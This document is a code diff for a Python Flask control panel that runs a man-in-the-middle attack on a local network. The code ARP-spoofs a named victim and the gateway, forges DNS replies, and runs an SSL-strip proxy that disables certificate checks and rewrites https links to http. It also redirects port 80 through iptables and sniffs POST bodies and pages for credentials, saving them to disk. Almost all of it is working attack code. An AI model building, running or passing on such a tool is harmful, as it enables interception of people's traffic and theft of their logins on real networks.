@@ -8,12 +8,13 @@ import os
 import signal
 import re 
 import uuid 
-
-# --- NEW: Imports for SSL Strip ---
 import socket
 import ssl
 import select
-# ----------------------------------
+
+# --- CONFIGURATION: Disable Scapy Checksums for VM Compatibility ---
+scapy.conf.checkIPaddr = False
+# -------------------------------------------------------------------
 
 app = Flask(__name__)
 
@@ -22,11 +23,10 @@ STOP_EVENT = threading.Event()
 ATTACK_THREAD = None
 SNIFFER_THREAD = None
 DNS_SPOOF_THREAD = None
-
-# --- NEW: SSL Strip Globals ---
 SSL_STRIP_THREAD = None
-SSL_STRIP_PORT = 10000  # Port where Python will listen for redirected HTTP traffic
-# ------------------------------
+
+# SSL Strip Configuration
+SSL_STRIP_PORT = 10000 
 
 # Create directory for captured files
 CAPTURE_DIR = "captured_pages"
@@ -47,10 +47,7 @@ STATUS = {
     "dns_ip": ""
 }
 
-# Dictionary to store full packet content in memory/disk reference
-PACKET_STORAGE = {}
-
-# --- UTILITY ---
+# --- UTILITY FUNCTIONS ---
 def log_msg(message):
     timestamp = time.strftime('%H:%M:%S')
     full_msg = f"[{timestamp}] {message}"
@@ -64,27 +61,22 @@ def set_ip_forwarding(value):
             f.write(str(value))
     except: pass
 
-# --- NEW: IPTables Management for SSL Strip ---
 def set_port_forwarding(enable):
-    """
-    Redirects TCP traffic from port 80 (HTTP) to our local Python proxy port.
-    """
+    """ Used only for SSL Strip mode to redirect Port 80 -> 10000 """
     try:
         action = "-A" if enable else "-D"
-        # Command: Append/Delete rule in NAT table to redirect TCP:80 -> SSL_STRIP_PORT
         cmd = f"iptables -t nat {action} PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {SSL_STRIP_PORT}"
         os.system(cmd)
         log_msg(f"[SYSTEM] IP Tables rule {'ADDED' if enable else 'REMOVED'} for SSL Strip.")
     except Exception as e:
         log_msg(f"[!] IP Tables Error: {e}")
-# ----------------------------------------------
 
 def get_mac(ip):
     try:
         arp_request = scapy.ARP(pdst=ip)
         broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
         arp_request_broadcast = broadcast/arp_request
-        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False, iface=STATUS["interface"])[0]
+        answered_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False, iface=STATUS["interface"])[0]
         return answered_list[0][1].hwsrc if answered_list else None
     except: return None
 
@@ -99,7 +91,7 @@ def restore(destination_ip, source_ip):
         packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
         scapy.send(packet, count=4, verbose=False, iface=STATUS["interface"])
 
-# --- DNS SPOOFING ---
+# --- DNS SPOOFING (From your working code) ---
 def dns_spoofer(packet):
     if STOP_EVENT.is_set(): return
     if packet.haslayer(DNS) and packet[DNS].qr == 0:
@@ -107,39 +99,38 @@ def dns_spoofer(packet):
             qname = packet[DNSQR].qname.decode('utf-8')
             target_domain = STATUS.get("dns_domain")
             fake_ip = STATUS.get("dns_ip")
+            
+            # Check if the domain matches
             if target_domain and target_domain in qname:
                 log_msg(f"Trapped DNS: {qname}")
+                
+                # Craft the spoofed response
                 scapy_ip = scapy.IP(src=packet[scapy.IP].dst, dst=packet[scapy.IP].src)
                 scapy_udp = scapy.UDP(sport=packet[scapy.UDP].dport, dport=packet[scapy.UDP].sport)
                 scapy_dns = scapy.DNS(id=packet[scapy.DNS].id, qr=1, aa=1, qd=packet[scapy.DNS].qd, 
                                       an=scapy.DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=fake_ip))
                 spoofed_pkt = scapy_ip / scapy_udp / scapy_dns
+                
+                # Let Scapy recalculate checksums
                 del spoofed_pkt[scapy.IP].len
                 del spoofed_pkt[scapy.IP].chksum
                 del spoofed_pkt[scapy.UDP].len
                 del spoofed_pkt[scapy.UDP].chksum
+                
                 scapy.send(spoofed_pkt, verbose=False, iface=STATUS["interface"])
                 log_msg(f"Sent DNS Reply -> {fake_ip}")
         except: pass
 
 def start_dns_spoofing():
+    # Only listens on UDP 53 to avoid conflict with the main sniffer
     scapy.sniff(filter="udp port 53", prn=dns_spoofer, iface=STATUS["interface"], stop_filter=lambda x: STOP_EVENT.is_set())
 
-# --- NEW: SSL STRIP IMPLEMENTATION ---
+# --- SSL STRIP PROXY ---
 def handle_client_connection(client_socket):
-    """
-    Handles a single victim connection. 
-    1. Reads HTTP request.
-    2. Connects to real server via HTTPS.
-    3. Sends request, gets response.
-    4. Downgrades HTTPS links to HTTP.
-    5. Sends back to victim.
-    """
     try:
         request_data = client_socket.recv(4096)
         if not request_data: return
 
-        # Parse Host
         try:
             headers = request_data.decode('utf-8', errors='ignore').split('\r\n')
             host = None
@@ -147,92 +138,84 @@ def handle_client_connection(client_socket):
                 if line.lower().startswith("host:"):
                     host = line.split(" ")[1].strip()
                     break
-        except:
-            host = None
+        except: host = None
 
         if host:
-            # Connect to Real Server (HTTPS port 443)
-            context = ssl.create_default_context()
-            context.check_hostname = False
-            context.verify_mode = ssl.CERT_NONE # Ignore self-signed certs for testing
+            # Try HTTPS first, fall back to HTTP if needed
+            try:
+                context = ssl.create_default_context()
+                context.check_hostname = False
+                context.verify_mode = ssl.CERT_NONE 
+                server_sock = socket.create_connection((host, 443), timeout=4)
+                secure_sock = context.wrap_socket(server_sock, server_hostname=host)
+            except:
+                # If HTTPS fails (local server), try HTTP port 80
+                secure_sock = socket.create_connection((host, 80), timeout=4)
 
-            with socket.create_connection((host, 443)) as server_sock:
-                with context.wrap_socket(server_sock, server_hostname=host) as secure_sock:
-                    
-                    # Modify headers to ensure we get plain text (no gzip)
-                    modified_req = re.sub(rb'Accept-Encoding:.*?\r\n', b'', request_data)
-                    modified_req = modified_req.replace(b'Connection: keep-alive', b'Connection: close')
-                    
-                    secure_sock.sendall(modified_req)
-                    
-                    # Read response
-                    response_data = b""
-                    while True:
-                        try:
-                            chunk = secure_sock.recv(4096)
-                            if not chunk: break
-                            response_data += chunk
-                        except: break
-                    
-                    # --- THE STRIPPING MAGIC ---
-                    # Replace https:// with http://
-                    stripped_response = response_data.replace(b'https://', b'http://')
-                    
-                    # Simple Credential Sniffing on the stripped data
-                    if b"password" in request_data.lower() or b"login" in request_data.lower():
-                        log_msg(f"[ALERT] SSL STRIP: Potential Creds found for {host}")
-                        STATUS["intercepted_data"].append({
-                            "id": str(uuid.uuid4()),
-                            "time": time.strftime('%H:%M:%S'),
-                            "src": "SSL_STRIP", "dst": host,
-                            "snippet": "[SSL STRIP] Data Intercepted (Check logs)",
-                            "type": "ALERT"
-                        })
+            with secure_sock:
+                # Remove compression and keep-alive to make manipulation easier
+                modified_req = re.sub(rb'Accept-Encoding:.*?\r\n', b'', request_data)
+                modified_req = modified_req.replace(b'Connection: keep-alive', b'Connection: close')
+                
+                secure_sock.sendall(modified_req)
+                
+                response_data = b""
+                while True:
+                    try:
+                        chunk = secure_sock.recv(4096)
+                        if not chunk: break
+                        response_data += chunk
+                    except: break
+                
+                # --- STRIP SSL ---
+                stripped_response = response_data.replace(b'https://', b'http://')
+                
+                # Check for creds in the stripped data
+                if b"password" in request_data.lower() or b"login" in request_data.lower():
+                    log_msg(f"[ALERT] SSL STRIP: Potential Creds found for {host}")
+                    STATUS["intercepted_data"].append({
+                        "id": str(uuid.uuid4()),
+                        "time": time.strftime('%H:%M:%S'),
+                        "src": "SSL_STRIP", "dst": host,
+                        "snippet": f"[SSL STRIP DATA] {request_data[:100]}",
+                        "type": "ALERT"
+                    })
 
-                    client_socket.sendall(stripped_response)
+                client_socket.sendall(stripped_response)
 
-    except Exception as e:
-        # log_msg(f"SSL Proxy Error: {e}") # Verbose logging
-        pass
+    except Exception: pass
     finally:
         client_socket.close()
 
 def run_ssl_strip():
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
     try:
         server.bind(('0.0.0.0', SSL_STRIP_PORT))
         server.listen(50)
         log_msg(f"[+] SSL Proxy listening on port {SSL_STRIP_PORT}")
-        
-        # Enable IPTables Redirect
         set_port_forwarding(True)
-
+        
         while not STOP_EVENT.is_set():
-            # Use select or timeout to allow checking STOP_EVENT
             server.settimeout(1.0) 
             try:
                 client_sock, addr = server.accept()
-                # Thread each connection
                 t = threading.Thread(target=handle_client_connection, args=(client_sock,))
                 t.daemon = True
                 t.start()
-            except socket.timeout:
-                continue
-            except Exception as e:
-                log_msg(f"[!] Accept Error: {e}")
-    except Exception as e:
-        log_msg(f"[!] FATAL SSL STRIP ERROR: {e}")
+            except socket.timeout: continue
+            except: pass
+    except Exception as e: log_msg(f"[!] FATAL SSL STRIP ERROR: {e}")
     finally:
         set_port_forwarding(False)
-        server.close()
-        log_msg("[-] SSL Strip Stopped.")
-# -------------------------------------
+        try: server.close()
+        except: pass
 
-# --- SNIFFER (Legacy ARP Mode) ---
+# --- GENERAL SNIFFER (From your working code) ---
 def packet_callback(packet):
     if STOP_EVENT.is_set(): return 
+    
+    # We filter for Raw TCP to find HTTP/Creds
     if packet.haslayer(scapy.Raw) and packet.haslayer(scapy.TCP):
         try:
             payload = packet[scapy.Raw].load.decode('utf-8', errors='ignore')
@@ -241,6 +224,7 @@ def packet_callback(packet):
             is_sensitive = False
             captured_secret = ""
 
+            # Check for secrets
             if "POST " in payload:
                 is_sensitive = True
                 lines = payload.split('\n')
@@ -252,10 +236,12 @@ def packet_callback(packet):
                         captured_secret = line.strip()
                         break
             
+            # Check for HTML content (Websites)
             is_html = False
             if "<html>" in payload or "<!DOCTYPE html>" in payload:
                 is_html = True
             
+            # Check for general HTTP headers (Your "Small Requests")
             is_http_info = "HTTP" in payload
 
             if is_sensitive or is_html or is_http_info:
@@ -278,6 +264,7 @@ def packet_callback(packet):
                     snippet = payload.split('\r\n')[0][:80]
                     log_type = "INFO"
 
+                # Save file for viewing
                 with open(f"{CAPTURE_DIR}/{pkt_id}.html", "w", encoding="utf-8") as f:
                     f.write(payload)
 
@@ -309,7 +296,7 @@ def run_attack_loop(target_ip, gateway_ip):
                 if gateway_mac: spoof(gateway_ip, target_ip, gateway_mac)
                 STATUS["packets"] += 2
             else:
-                log_msg(f"[!] WARNING: Victim unreachable.")
+                pass # Silent fail
             time.sleep(2)
     except Exception as e: log_msg(f"ERROR: {e}")
     finally:
@@ -317,9 +304,8 @@ def run_attack_loop(target_ip, gateway_ip):
         if get_mac(target_ip) and get_mac(gateway_ip):
             restore(target_ip, gateway_ip)
         set_ip_forwarding(0)
-        # --- NEW: Ensure Port Forwarding is off ---
-        set_port_forwarding(False) 
-        # ------------------------------------------
+        # Ensure SSL rules are cleared if they were used
+        set_port_forwarding(False)
         STATUS["state"] = "IDLE"
         STATUS["target_mac"] = "N/A"
         STATUS["mode"] = "NONE"
@@ -360,12 +346,14 @@ def action():
         
         STOP_EVENT.clear()
         
-        # Always start ARP Spoofing (Required for all modes)
-        ATTACK_THREAD = threading.Thread(target=run_attack_loop, args=(STATUS["target"], STATUS["gateway"]))
-        ATTACK_THREAD.daemon = True
-        ATTACK_THREAD.start()
+        # 1. ALWAYS Start the Sniffer (Restores logs for small HTTP requests)
+        # This listens for TCP/80 and captures HTML/Post data directly from wire
+        if SNIFFER_THREAD is None or not SNIFFER_THREAD.is_alive():
+            SNIFFER_THREAD = threading.Thread(target=scapy.sniff, kwargs={'iface': STATUS["interface"], 'store': 0, 'prn': packet_callback})
+            SNIFFER_THREAD.daemon = True
+            SNIFFER_THREAD.start()
 
-        # --- NEW: Mode Selection Logic ---
+        # 2. Start Modules based on selection
         if action_type == 'start_dns':
             STATUS["mode"] = "DNS SPOOF"
             DNS_SPOOF_THREAD = threading.Thread(target=start_dns_spoofing)
@@ -379,28 +367,25 @@ def action():
             SSL_STRIP_THREAD.daemon = True
             SSL_STRIP_THREAD.start()
             log_msg(f"[+] SSL Strip Mode Activated")
-            
+        
         else:
             STATUS["mode"] = "ARP SNIFF"
-            # Only run raw packet sniffer if NOT in SSL Strip mode (conflicts)
-            SNIFFER_THREAD = threading.Thread(target=scapy.sniff, kwargs={'iface': STATUS["interface"], 'store': 0, 'prn': packet_callback})
-            SNIFFER_THREAD.daemon = True
-            SNIFFER_THREAD.start()
-            log_msg("[+] ARP Sniffing Started")
-        # ---------------------------------
+            log_msg("[+] ARP Attack Started")
 
+        # 3. ALWAYS Start ARP Spoofing
+        ATTACK_THREAD = threading.Thread(target=run_attack_loop, args=(STATUS["target"], STATUS["gateway"]))
+        ATTACK_THREAD.daemon = True
+        ATTACK_THREAD.start()
+        
         return jsonify({"status": "success"})
     
     elif action_type == 'stop':
         STOP_EVENT.set()
-        # --- NEW: Cleanup ---
         set_port_forwarding(False)
-        # --------------------
         return jsonify({"status": "success", "message": "Stopping..."})
     
     return jsonify({"status": "error", "message": "Invalid action."})
 
 if __name__ == '__main__':
     scapy.conf.iface = STATUS["interface"]
-    # Must run as sudo for scapy/iptables/port 10000 binding
     app.run(host='0.0.0.0', port=5000, debug=False)
